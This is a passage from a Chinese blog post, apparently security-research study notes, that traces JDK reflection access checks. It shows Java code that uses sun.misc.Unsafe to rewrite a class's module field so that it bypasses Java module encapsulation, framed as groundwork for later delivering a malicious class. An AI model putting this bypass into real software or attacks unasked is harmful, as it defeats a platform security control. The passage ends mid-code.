+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAccessible</span><span class="p">(</span><span class="kt">boolean</span><span class="w"> </span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">AccessibleObject</span><span class="p">.</span><span class="na">checkPermission</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="n">checkCanSetAccessible</span><span class="p">(</span><span class="n">Reflection</span><span class="p">.</span><span class="na">getCallerClass</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">setAccessible0</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>checkCanSetAccessible()</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">checkCanSetAccessible</span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">caller</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                      </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">declaringClass</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                                      </span><span class="kt">boolean</span><span class="w"> </span><span class="n">throwExceptionIfDenied</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">caller</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">MethodHandle</span><span class="p">.</span><span class="na">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalCallerException</span><span class="p">();</span><span class="w">   </span><span class="c1">// should not happen</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Module</span><span class="w"> </span><span class="n">callerModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">caller</span><span class="p">.</span><span class="na">getModule</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Module</span><span class="w"> </span><span class="n">declaringModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaringClass</span><span class="p">.</span><span class="na">getModule</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">callerModule</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">declaringModule</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">callerModule</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">())</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">declaringModule</span><span class="p">.</span><span class="na">isNamed</span><span class="p">())</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">pn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaringClass</span><span class="p">.</span><span class="na">getPackageName</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">modifiers</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">Executable</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">modifiers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">Executable</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">).</span><span class="na">getModifiers</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">modifiers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">Field</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">).</span><span class="na">getModifiers</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// class is public and package is exported to caller</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isClassPublic</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Modifier</span><span class="p">.</span><span class="na">isPublic</span><span class="p">(</span><span class="n">declaringClass</span><span class="p">.</span><span class="na">getModifiers</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isClassPublic</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">declaringModule</span><span class="p">.</span><span class="na">isExported</span><span class="p">(</span><span class="n">pn</span><span class="p">,</span><span class="w"> </span><span class="n">callerModule</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// member is public</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Modifier</span><span class="p">.</span><span class="na">isPublic</span><span class="p">(</span><span class="n">modifiers</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// member is protected-static</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Modifier</span><span class="p">.</span><span class="na">isProtected</span><span class="p">(</span><span class="n">modifiers</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">Modifier</span><span class="p">.</span><span class="na">isStatic</span><span class="p">(</span><span class="n">modifiers</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">isSubclassOf</span><span class="p">(</span><span class="n">caller</span><span class="p">,</span><span class="w"> </span><span class="n">declaringClass</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// package is open to caller</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">declaringModule</span><span class="p">.</span><span class="na">isOpen</span><span class="p">(</span><span class="n">pn</span><span class="p">,</span><span class="w"> </span><span class="n">callerModule</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">throwExceptionIfDenied</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// not accessible</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;Unable to make &#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">Field</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">msg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">&#34;field &#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">msg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">this</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; accessible: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">declaringModule</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; does not \&#34;&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isClassPublic</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">Modifier</span><span class="p">.</span><span class="na">isPublic</span><span class="p">(</span><span class="n">modifiers</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">msg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">&#34;exports&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">msg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">&#34;opens&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">msg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">&#34; &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">pn</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;\&#34; to &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">callerModule</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InaccessibleObjectException</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InaccessibleObjectException</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">printStackTraceWhenAccessFails</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">err</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="n">e</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">            
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里在最后可以看到上面的报错信息生成处。
+如果不是因为可能这样的地方存在很多，其实有个通用思路就是全局搜索关键语句定位——但是这个涉及到太底层的代码，这样的报错语句基本一致，所以断点调试是最佳方法。</p>
+<blockquote>
+<p>获取到的信息</p>
+</blockquote>
+<p>这里这段代码值得首先考虑：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="n">Module</span><span class="w"> </span><span class="n">callerModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">caller</span><span class="p">.</span><span class="na">getModule</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Module</span><span class="w"> </span><span class="n">declaringModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaringClass</span><span class="p">.</span><span class="na">getModule</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">callerModule</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">declaringModule</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">callerModule</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">())</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">declaringModule</span><span class="p">.</span><span class="na">isNamed</span><span class="p">())</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>三个条件任选一个满足就可以返回True，后续代码也不用执行。</p>
+<ol>
+<li>调用者类（caller）所属模块（module）和被调用者（declaring）的同属一个</li>
+<li>callerModule是<code>java.base</code>模块的<code>Object</code>类的模块</li>
+<li>被调用者的所属module是<code>未命名模块</code>——未命名模块（Unnamed Module）指的是<strong>类路径（classpath）中的类</strong>，而不是 <code>module-path</code> 上的类</li>
+</ol>
+<p>根据参考中的解释，<code>sun.misc</code>和<code>sun.reflect</code>处于反射白名单。</p>
+<blockquote>
+<p>那我们可以尝试利用Unsafe来修改当前类的module属性和 <code>java.*</code> 下类的module属性一致来绕过</p>
+</blockquote>
+<hr>
+<h3 id="unsafe">Unsafe
+</h3><p><a class="link" href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html"  target="_blank" rel="noopener"
+    >美团技术团队-Java魔法类 Unsafe</a></p>
+<p>要点：</p>
+<ol>
+<li><code>Unsafe</code>是<code>sun.misc</code>的一个类，提供执行低级别但可能不安全的操作方法</li>
+<li>获取该类实例方法：
+<ol>
+<li><code>getUnsafe</code></li>
+<li>通过反射获取单例对象<code>theUnsafe</code></li>
+</ol>
+</li>
+<li>Unsafe类中有个 <code>getAndSetObject</code> 方法，其和反射赋值功能差不多，利用这个修改调用类的module——来自参考</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ForceInline</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getAndSetObject</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">newValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="n">theInternalUnsafe</span><span class="p">.</span><span class="na">getAndSetReference</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">newValue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>代码参考</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 反射调用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="w"> </span><span class="n">unsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//获得单例对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="w"> </span><span class="n">field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// Object类的module</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Module</span><span class="w"> </span><span class="n">baseModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//将指定的类currentClass的module修改成和Object类module一致</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Main</span><span class="p">.</span><span class="na">class</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">baseModule</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样就能通过<code>checkCanSetAccessible()</code>的检查</p>
+<hr>
+<p>上面的部分在于：</p>
+<ul>
+<li>如何进行反射
+<ul>
+<li>如何绕开反射限制</li>
+</ul>
+</li>
+</ul>
+<p>那么后面就是如何触发，也可以是如何将恶意类送到它该去的地方。</p>
+<hr>
+<h4 id="番外通过unsafe修改string-x">番外——通过Unsafe修改String x
+</h4><blockquote>
+<p>这个是在整理declaredField的时候忽然想到的，也确实写成功了。只是为了方便理解，一般好像没人这样无聊 ^^ 就是写完发现另一个问题，如果不使用这种方法，怎么修改String x的value?</p>
+</blockquote>
+<p>先看原代码：
+AI写的，试图告诉我关于declaredField的作用
+但如果仔细学了上面的内容就会知道，绝对是个错误的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Ys</span><span class="w"> </span><span class="p">{</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 目标对象：x 的 Class 是 String        </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;Act like Angle&#34;</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 1. 获取 x 的 Class 对象  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 2. 获取类中声明的字段（仅当前类，不包含父类）  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 参数是字段名，返回当前类的 Field 对象  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 3. 强制打破访问控制（允许访问私有字段）  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 4. 获取字段值  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="n">declaredField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">x</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 5. 输出原始字符串  </span><span class="w">
